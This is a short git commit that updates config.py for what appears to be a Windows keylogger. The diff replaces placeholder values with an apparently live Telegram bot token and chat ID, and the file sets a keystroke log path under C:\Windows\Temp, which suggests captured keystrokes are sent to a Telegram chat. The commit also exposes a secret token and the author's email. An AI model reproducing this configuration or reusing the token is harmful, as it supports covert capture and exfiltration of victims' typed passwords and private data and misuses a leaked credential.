9de3efe12674bd4d5f997052a90618ade6efd837
prank9912 <valeriopelato23@gmail.com>
2025-06-08 12:53:42 +0200

    Update config.py

--- config.py
+++ config.py
@@ -1,6 +1,6 @@
 # Token/ID
-TelegramToken = 'xxxxxxxxxxxxxxx'
-ChatId = 'xxxxxxxxxxxxxxx'
+TelegramToken = '7605005911:AAFGRr4k25QbRLOlxcT-6lb3riLB5iWlCjI'
+ChatId = '5709299213'
 
 # Log paths
 KeyLog = 'C:\\Windows\\Temp\\keylog.txt'
